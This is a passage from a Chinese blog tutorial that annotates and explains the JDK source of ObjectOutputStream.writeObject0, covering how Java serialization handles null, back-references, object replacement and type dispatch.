class="line">    <span class="comment">//    - setBlockDataMode(false) 返回调用前的模式，以便 finally 时恢复（保证读写对齐）。</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">oldMode</span> <span class="operator">=</span> bout.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ② 记录写入深度：</span></span><br><span class="line">    <span class="comment">//    - depth 用于跟踪嵌套层级；部分异常处理（例如致命异常封装）会参考 depth 是否回到 0。</span></span><br><span class="line">    depth++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// =====================  第一段：快速路径（null / 已写出 / 特例）  =====================</span></span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.1 替换表标准化：</span></span><br><span class="line">        <span class="comment">//     subs.lookup(obj) 会将“曾被 writeReplace/replaceObject 确定过的替换关系”</span></span><br><span class="line">        <span class="comment">//     进行稳定化；对 null 直接返回 null。</span></span><br><span class="line">        <span class="keyword">if</span> ((obj = subs.lookup(obj)) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 情况 A：null 直接写 TC_NULL（0x70），无需进入后续逻辑</span></span><br><span class="line">            writeNull();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// 情况 B：允许共享，且该对象已写过（在句柄表中有条目）</span></span><br><span class="line">            <span class="comment">//         → 写 TC_REFERENCE（0x71） + 4 字节句柄 ID，避免重复写整对象</span></span><br><span class="line">            writeHandle(h);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">            <span class="comment">// 情况 C：是“类对象”（java.lang.Class）</span></span><br><span class="line">            <span class="comment">//         → 写 TC_CLASS（0x76）并跟随该类的描述引用或描述体</span></span><br><span class="line">            writeClass((Class) obj, unshared);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">            <span class="comment">// 情况 D：是“类描述符”（ObjectStreamClass，包含 SUID、字段签名等）</span></span><br><span class="line">            <span class="comment">//         → 写 TC_CLASSDESC（0x72）或代理描述 TC_PROXYCLASSDESC（0x7D）</span></span><br><span class="line">            writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// =====================  第二段：对象替换链（writeReplace / replaceObject） =====================</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">orig</span> <span class="operator">=</span> obj;            <span class="comment">// 保留“最初对象”，用于判断是否发生替换</span></span><br><span class="line">        Class&lt;?&gt; cl = obj.getClass(); <span class="comment">// 当前待写对象的运行时类型</span></span><br><span class="line">        ObjectStreamClass desc;       <span class="comment">// 该类型对应的序列化描述符</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="comment">// 查/建该类的 ObjectStreamClass 描述符（会解析序列化相关元信息）</span></span><br><span class="line">            <span class="comment">// 第二个参数 true 表示：如无缓存需构建（不同 JDK 具体语义略有差别，但可理解为“强制查找/建”）</span></span><br><span class="line">            desc = ObjectStreamClass.lookup(cl, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 若该类声明了私有的 writeReplace()：</span></span><br><span class="line">            <span class="comment">//   - 调用后可能返回：</span></span><br><span class="line">            <span class="comment">//       * null：表示最终替换为 null（将写 TC_NULL）</span></span><br><span class="line">            <span class="comment">//       * 同类对象（cl 不变）：替换链到此收敛，跳出循环</span></span><br><span class="line">            <span class="comment">//       * 不同类对象（cl 变化）：继续对新对象的新类进行 writeReplace 检查（多级替换）</span></span><br><span class="line">            <span class="keyword">if</span> (!desc.hasWriteReplaceMethod()) &#123;</span><br><span class="line">                <span class="keyword">break</span>; <span class="comment">// 无 writeReplace，跳出替换链</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">rep</span> <span class="operator">=</span> desc.invokeWriteReplace(obj); <span class="comment">// 反射调用私有 writeReplace()</span></span><br><span class="line">            <span class="keyword">if</span> (rep == <span class="literal">null</span>) &#123;</span><br><span class="line">                obj = <span class="literal">null</span>;           <span class="comment">// 标记为最终写 null</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Class&lt;?&gt; repCl = rep.getClass();</span><br><span class="line">            obj = rep;                <span class="comment">// 使用替换后的对象继续下一轮</span></span><br><span class="line">            <span class="keyword">if</span> (repCl == cl) &#123;</span><br><span class="line">                <span class="comment">// 替换后类型未变，视为收敛</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            cl = repCl;               <span class="comment">// 类型改变 → 继续循环，对新类型做同样检查</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 若启用了“全局替换钩子”（仅当自定义子类通过 enableReplaceObject(true) 开启）：</span></span><br><span class="line">        <span class="keyword">if</span> (enableReplace) &#123;</span><br><span class="line">            <span class="comment">// replaceObject 可被子类重写，用于统一的替换策略（如过滤、包装等）</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">rep</span> <span class="operator">=</span> replaceObject(obj);</span><br><span class="line">            <span class="comment">// 注意：允许返回 null（表示写 null）</span></span><br><span class="line">            <span class="keyword">if</span> (rep != obj &amp;&amp; rep != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 类型改变时，需要更新类与描述符，以便后续正确分派</span></span><br><span class="line">                cl = rep.getClass();</span><br><span class="line">                desc = ObjectStreamClass.lookup(cl, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            obj = rep;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// =====================  第三段：若发生替换，登记并重走快速判定 =====================</span></span><br><span class="line">        <span class="keyword">if</span> (obj != orig) &#123;</span><br><span class="line">            <span class="comment">// 3.1 登记 orig -&gt; obj 的替换映射：</span></span><br><span class="line">            <span class="comment">//     这样后续再次遇到 orig 时，subs.lookup(orig) 会稳定地返回相同的替代对象 obj。</span></span><br><span class="line">            subs.assign(orig, obj);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3.2 替换后需要再做一次“快速路径”检查（null / 已写出 / Class / ObjectStreamClass）</span></span><br><span class="line">            <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">                writeNull();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                writeHandle(h);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">                writeClass((Class) obj, unshared);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">                writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 注意：此处未直接把 obj 记入句柄表；真正登记通常发生在后续具体写出函数</span></span><br><span class="line">            <span class="comment">// （如 writeString / writeArray / writeOrdinaryObject 中的 handles.assign(...)）</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// =====================  第四段：类型分派（进入实际的编码/写出逻辑） =====================</span></span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            <span class="comment">// 字符串：</span></span><br><span class="line">            <span class="comment">// - 根据 MUTF-8 字节长度选择 TC_STRING(&lt;=0xFFFF) 或 TC_LONGSTRING(&gt;0xFFFF)</span></span><br><span class="line">            <span class="comment">// - 内部会按 unshared 语义决定是否登记句柄</span></span><br><span class="line">            writeString((String) obj, unshared);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">            <span class="comment">// 数组：</span></span><br><span class="line">            <span class="comment">// - 原始类型数组与对象数组的编码不同</span></span><br><span class="line">            <span class="comment">// - 会写 TC_ARRAY + 类描述（或引用）+ 长度 + 元素数据</span></span><br><span class="line">            writeArray(obj, desc, unshared);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">            <span class="comment">// 枚举：</span></span><br><span class="line">            <span class="comment">// - 写 TC_ENUM + 枚举类型描述（或引用）+ 枚举常量名（String）</span></span><br><span class="line">            writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Serializable) &#123;</span><br><span class="line">            <span class="comment">// 可序列化的常规对象：</span></span><br><span class="line">            <span class="comment">// - 写 TC_OBJECT + 类描述（或引用）</span></span><br><span class="line">            <span class="comment">// - 按声明的字段（非 transient/非 static）自顶向下写父类链上的实例数据</span></span><br><span class="line">            <span class="comment">// - 若类实现 Externalizable 或声明自定义 writeObject/readObject 也会在这里处理</span></span><br><span class="line">            writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 不能序列化：抛出 NotSerializableException，必要时附带调试路径栈信息</span></span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(</span><br><span class="line">                    cl.getName() + <span class="string">&quot;\n&quot;</span> + debugInfoStack.toString());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(cl.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// ⑤ 恢复调用前的环境，确保流状态一致</span></span><br><span class="line">        depth--;                        <span class="comment">// 恢复嵌套深度</span></span><br><span class="line">        bout.setBlockDataMode(oldMode); <span class="comment">// 恢复原先的块模式（保证输入端按相同模式读取）</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>writeObject0()</code> 方法最开始的地方，首先代码先关闭输出流的<code>Data Block</code>模式，并且将<strong>原始模式</strong>赋值给变量 <code>oldMode</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 进入结构化写入：先关掉块数据模式（非块模式用于写 TC_OBJECT / 类描述 等结构标记）</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">oldMode</span> <span class="operator">=</span> bout.setBlockDataMode(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure></div>

<p>接下来会处理<strong>已经处理过的</strong>和<strong>不可替换的</strong>对象，这些都是不能够序列化的，其实在大多数情况下，我们的代码都不会进入这个代码块。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ============================================================</span></span><br><span class="line"><span class="comment">// 1) 处理已知替换与“null”直写，以及已写出对象的句柄复用</span></span><br><span class="line"><span class="comment">// ============================================================</span></span><br><span class="line"><span class="type">int</span> h;</span><br><span class="line"><span class="comment">// 通过替换表做一次“规范化”查找：</span></span><br><span class="line"><span class="comment">//  - 对 null 会返回 null；</span></span><br><span class="line"><span class="comment">//  - 对已登记的被替换对象，返回其替换后的对象（保持替换稳定）。</span></span><br><span class="line"><span class="keyword">if</span> ((obj = subs.lookup(obj)) == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 1.a 对象为 null → 写 TC_NULL</span></span><br><span class="line">    writeNull();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 1.b 允许共享，且对象此前已写出过 → 写引用 TC_REFERENCE + 句柄ID</span></span><br><span class="line">    writeHandle(h);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">    <span class="comment">// 1.c 直接写类对象（TC_CLASS + 类描述或引用）</span></span><br><span class="line">    writeClass((Class) obj, unshared);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">    <span class="comment">// 1.d 写类描述符（包含 SUID、字段签名等）</span></span><br><span class="line">    writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>具体来看，代码首先会进入 <code>subs.lookup(obj)</code> 进行判断。该方法会查找并返回给定对象的替换。如果找不到替换，则返回查找对象本身。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 查找并返回给定对象的“替代对象”（replacement）。</span></span><br><span class="line"><span class="comment"> * 若未找到对应的替代对象，则返回传入的原对象本身。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 说明：</span></span><br><span class="line"><span class="comment"> * - htab：对象 → 槽位索引 的哈希表，lookup(obj) 找不到时返回负数。</span></span><br><span class="line"><span class="comment"> * - reps：与 htab 的索引一一对应的替代对象数组；reps[i] 是索引 i 的替代对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj  待查询是否有替代对象的原对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>     若已登记替代对象则返回该替代对象，否则返回原对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">Object <span class="title function_">lookup</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    <span class="comment">// 在哈希表中查询 obj 对应的槽位索引；未命中会得到负数</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> htab.lookup(obj);</span><br><span class="line">    <span class="comment">// 命中：返回 reps[index]；未命中：直接返回原对象 obj</span></span><br><span class="line">    <span class="keyword">return</span> (index &gt;= <span class="number">0</span>) ? reps[index] : obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>也就是说，这个方法实际上就是处理以前写入的对象和不可替换的对象。更直白点的意思，这段代码实际上做的是一个检测功能，如果检测到当前传入对象在“替换哈希表(<code>ReplaceTable</code>)”中无法找到，那么就调用 <code>writeNull</code> 方法。</p>
<p>接着继续判断当前写入方式是不是“<code>unshared</code>”方式，然后可以看到紧跟着的就是 <code> handles.lookup(obj)</code>：</p>
<p>该 <code>lookup</code> 方法会查找并返回与给定对象关联的 <code>handler</code>，如果没有找到映射，则返回 -1，直白的意思就是说判断是否在“引用哈希表(<code>HandleTable</code>)”中找到该引用，如果有，那么调用 <code>writeHandle</code> 方法并且返回；如果没找到，那么返回 -1，需要进一步序列化处理。</p>
<p>之后判断当前传入对象是不是特殊类型的 <code>Class</code> 和 <code>ObjectStreamClass</code>，如果是，则调用 <code>writeClass</code> 或 <code>writeClassDesc</code> 方法并且返回。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">    <span class="comment">// 1.c 直接写类对象（TC_CLASS + 类描述或引用）</span></span><br><span class="line">    writeClass((Class) obj, unshared);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">    <span class="comment">// 1.d 写类描述符（包含 SUID、字段签名等）</span></span><br><span class="line">    writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当以上条件都不满足的时候(不进入if)，开始检查是否开启了替换对象。但实际上 <code>enableReplace</code> 的值通常为 <code>false</code>，因此我们并不会进入这一代码段。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ============================================================</span></span><br><span class="line"><span class="comment">// 2) writeReplace 链 + 全局替换钩子 replaceObject</span></span><br><span class="line"><span class="comment">// ============================================================</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">orig</span> <span class="operator">=</span> obj;            <span class="comment">// 记录原始对象，用于检测是否发生替换</span></span><br><span class="line">Class&lt;?&gt; cl = obj.getClass();</span><br><span class="line">ObjectStreamClass desc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">// REMIND: skip this check for strings/arrays?</span></span><br><span class="line">    <span class="comment">// 译：是否需要对字符串/数组跳过 writeReplace 检查（保留上游注释）</span></span><br><span class="line">    Class&lt;?&gt; repCl;</span><br><span class="line">    <span class="comment">// 查找/构建该类的序列化描述符（若类可序列化，将解析其 writeReplace 等）</span></span><br><span class="line">    desc = ObjectStreamClass.lookup(cl, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// 若类定义了私有的 writeReplace()，则调用它；当返回的替代对象</span></span><br><span class="line">    <span class="comment">//   - 为 null：直接结束（后面会写 null）</span></span><br><span class="line">    <span class="comment">//   - 与原类相同：链收敛，结束</span></span><br><span class="line">    <span class="comment">//   - 与原类不同：继续对“新对象的新类”循环检测（多级替换）</span></span><br><span class="line">    <span class="keyword">if</span> (!desc.hasWriteReplaceMethod() ||</span><br><span class="line">        (obj = desc.invokeWriteReplace(obj)) == <span class="literal">null</span> ||</span><br><span class="line">        (repCl = obj.getClass()) == cl)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cl = repCl;  <span class="comment">// 继续沿替换后的类型进行检查</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 若开启了全局替换（通过 enableReplaceObject(true)），则应用 replaceObject 钩子</span></span><br><span class="line"><span class="keyword">if</span> (enableReplace) &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">rep</span> <span class="operator">=</span> replaceObject(obj);</span><br><span class="line">    <span class="keyword">if</span> (rep != obj &amp;&amp; rep != <span class="literal">null</span>) &#123;</span><br><span class="line">        cl = rep.getClass();</span><br><span class="line">        desc = ObjectStreamClass.lookup(cl, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    obj = rep;  <span class="comment">// 允许将对象替换为 null（表示最终写 null）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果对象被替换，这里会对原始对象进行二次检查，和最开始的那段代码很像，这里先将替换对象插入到 <code>subs</code>(替换哈希表)中，然后进行类似的判断。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ============================================================</span></span><br><span class="line"><span class="comment">// 3) 如果发生了“对象替换”，需要：</span></span><br><span class="line"><span class="comment">//    - 在替换表登记 orig -&gt; obj；</span></span><br><span class="line"><span class="comment">//    - 再次执行第 1 步的快速判定（null / 句柄复用 / Class / ObjectStreamClass）</span></span><br><span class="line"><span class="comment">// ============================================================</span></span><br><span class="line"><span class="keyword">if</span> (obj != orig) &#123;</span><br><span class="line">    <span class="comment">// 登记替换映射：保证后续再次遇到 orig 时稳定替换为同一个 obj</span></span><br><span class="line">    subs.assign(orig, obj);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">        writeNull();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        writeHandle(h);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">        writeClass((Class) obj, unshared);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">        writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>以上执行都完成过后，会处理剩余对象类型：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ============================================================</span></span><br><span class="line"><span class="comment">// 4) 常见类型分派：字符串 / 数组 / 枚举 / 常规可序列化对象</span></span><br><span class="line"><span class="comment">// ============================================================</span></span><br><span class="line"><span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">    <span class="comment">// 写字符串：根据长度选择 TC_STRING 或 TC_LONGSTRING</span></span><br><span class="line">    writeString((String) obj, unshared);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">    <span class="comment">// 写数组：原始类型数组与对象数组编码不同</span></span><br><span class="line">    writeArray(obj, desc, unshared);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">    <span class="comment">// 写枚举：写所属枚举类型描述符 + 常量名</span></span><br><span class="line">    writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Serializable) &#123;</span><br><span class="line">    <span class="comment">// 常规对象：写类描述符、实例数据（含父类链上非 transient 非 static 字段）</span></span><br><span class="line">    <span class="comment">// 内部会处理 Externalizable / writeObject 自定义等分支</span></span><br><span class="line">    writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 不可序列化：抛出 NSEE；若启用扩展调试信息，附带“写入路径栈”</span></span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(</span><br><span class="line">            cl.getName() + <span class="string">&quot;\n&quot;</span> + debugInfoStack.toString());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(cl.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>如果传入对象为 <code>String</code> 类型，那么调用 <code>writeString</code> 方法将数据写入字节流；</p>
</li>
<li><p>如果传入对象为 <code>Array</code> 类型，那么调用 <code>writeArray</code> 方法将数据写入字节流；</p>
</li>
<li><p>如果传入对象为 <code>Enum</code> 类型，调用 <code>writeEnum</code> 方法将数据写入字节流；</p>
</li>
<li><p>如果传入对象实现了 <code>Serializable</code> 接口，调用 <code>writeOrdinaryObject</code> 方法将数据写入字节流；</p>
</li>
</ul>
<p>以上条件都不满足时则抛出 <code>NotSerializableException</code> 异常信息；</p>
<p>对于 <code>writeString</code>、<code>writeArray</code>、<code>writeEnum</code> 的方法我们就不详谈了，只以 <code>writeString</code> 为例简单讲下。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将给定字符串写入到序列化流；根据字符串按“修改版 UTF-8（MUTF-8）”编码后的字节长度，</span></span><br><span class="line"><span class="comment"> * 在两种格式之间二选一：</span></span><br><span class="line"><span class="comment"> * - 标准字符串：TC_STRING + 2 字节长度（&lt;= 0xFFFF）+ UTF 字节</span></span><br><span class="line"><span class="comment"> * - 长字符串：  TC_LONGSTRING + 